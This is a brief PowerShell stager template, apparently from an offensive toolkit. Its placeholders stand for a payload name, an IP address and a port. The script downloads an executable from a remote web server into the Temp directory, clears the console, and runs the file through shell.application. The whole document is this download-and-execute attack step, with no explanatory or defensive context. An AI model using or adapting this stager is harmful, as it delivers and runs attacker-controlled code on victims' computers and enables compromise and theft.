<# 
Download and execute a .exe
#> 
$ProcName = "{{PAYLOAD_NAME}}"
$WebFile = "http://{{IP}}:{{PORT}}/public/$ProcName"
 
Clear-Host
 
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:Temp\$ProcName")
(New-Object -com shell.application).shellexecute($env:Temp\$ProcName)